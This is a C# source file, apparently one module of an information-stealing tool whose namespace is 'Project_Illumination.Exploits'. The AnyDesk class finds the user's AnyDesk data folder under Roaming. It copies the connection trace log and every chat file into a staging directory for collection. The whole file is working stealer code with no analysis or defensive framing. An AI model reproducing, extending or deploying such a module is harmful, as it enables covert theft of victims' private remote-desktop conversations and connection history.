using System.IO;

namespace Project_Illumination.Exploits.Programs
{
    internal class AnyDesk
    {
        private readonly string _path, _anyDesk;
        private readonly bool _chats, _connectionLog;
        public AnyDesk(bool chats = true, bool connectionLog = true)
        {
            if (!Directory.Exists(_anyDesk = @$"{Paths.ROAMING}\AnyDesk")) return;
            Directory.CreateDirectory(_path = $@"{Paths.SAVE_PATH}\Programs\AnyDesk");

            _chats = chats;
            _connectionLog = connectionLog;
        }

        public void Run()
        {
            if (File.Exists($@"{_anyDesk}\connection_trace.txt") && _connectionLog)
                File.Copy($@"{_anyDesk}\connection_trace.txt", $@"{_path}\connection_trace.txt");

            if (!Directory.Exists($@"{_anyDesk}\chat") || !_chats) return;
            Directory.CreateDirectory($@"{_path}\Chats");

            foreach (var chatFile in Directory.GetFiles($@"{_anyDesk}\chat"))
            {
                var fileInfo = new FileInfo(chatFile);
                File.Copy(chatFile, $@"{_path}\Chats\{fileInfo.Name}");
            }
        }
    }
}
